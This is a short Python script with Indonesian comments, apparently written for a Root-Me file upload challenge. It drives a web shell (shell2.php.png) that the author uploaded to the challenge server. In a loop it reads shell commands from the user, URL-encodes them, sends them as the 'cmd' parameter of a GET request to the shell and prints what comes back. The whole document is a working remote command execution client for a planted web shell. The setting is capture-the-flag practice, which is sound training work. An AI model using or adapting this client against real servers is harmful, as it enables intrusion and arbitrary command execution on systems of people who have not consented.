import requests
import urllib.parse  

# Masukkan base URL nyaa
url_base = f'http://challenge01.root-me.org/web-serveur/ch20/galerie/upload/312e92f3aa1d62e416be9b696f505e38/shell2.php.png'

# Kita gunakan perulangan untuk melaukan agar kita bisa melakukan injeksi command lagi tanpa menjalankan scriptnya berulang - ulang
while True:
    
    # Masukkan inputan comman injection
    print("Masukkan perintah (atau 'exit' untuk keluar)")
    cmd = input("Masukkan Command Injection: ")

    # opsi untuk keluar dair perulangannya
    if cmd.lower() == 'exit' :
        break

    # inputan harus di encode dulu ke dalam URL
    encoded_input = urllib.parse.quote(cmd)

    # kita atur format injeksinya
    url = f"{url_base}?cmd={encoded_input}"

    # kita akses requesnya dengan method GET
    response = requests.get(url)

    # kita tampilakn hasil injeksinya
    print(response.text)
